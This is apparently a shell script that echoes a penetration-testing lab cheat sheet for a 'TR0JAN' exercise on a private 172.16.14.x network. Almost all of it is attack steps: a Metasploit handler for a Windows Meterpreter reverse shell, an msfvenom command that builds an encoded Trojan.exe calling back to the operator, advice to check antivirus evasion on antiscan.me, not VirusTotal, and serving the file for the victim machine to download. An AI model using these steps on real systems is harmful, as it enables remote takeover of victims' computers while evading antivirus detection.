echo '
--] TR0JAN 2 35

OPERATOR   === KALI               IP === 132
CHARLIE    === METASPLOITE 2      IP === 131
TANGO      === WIN 7              IP === 134
OSCAR      === WIN 10             IP === 133
LAB        === NET                ALL === 172.16.14.IP


OPERATOR    ==> TASK ==> sudo su << for to be root
OPERATOR    ==> TASK ==> msfconsole -q
OPERATOR    ==> TASK ==> use exploit/multi/handler
OPERATOR    ==> TASK ==> set payload windows/meterpreter/reverse_tcp
OPERATOR    ==> TASK ==> set lhost IP_OPERATOR
OPERATOR    ==> TASK ==> show options
OPERATOR    ==> TASK ==> jobs
OPERATOR    ==> TASK ==> jobs -K
OPERATOR    ==> TASK ==> exploit -j

OPERATOR    ==> TASK ==> msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP_OPERATOR] LPORT=[PORT_OPERATOR] -e x86/shikata_ga_nai -f exe -o Trojan.exe
OPERATOR    ==> TASK ==> msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.14.132 LPORT=4444 -e x86/shikata_ga_nai -f exe -o Trojan.exe
OPERATOR    ==> TASK ==> antiscan.me || dont use VT use antiscan.me


OPERATOR    ==> TASK ==> python3 -m http.server 80
OSCAR       ==> TASK ==> explorer and open http://IP_OPERATOR 172.16.14.132


'
read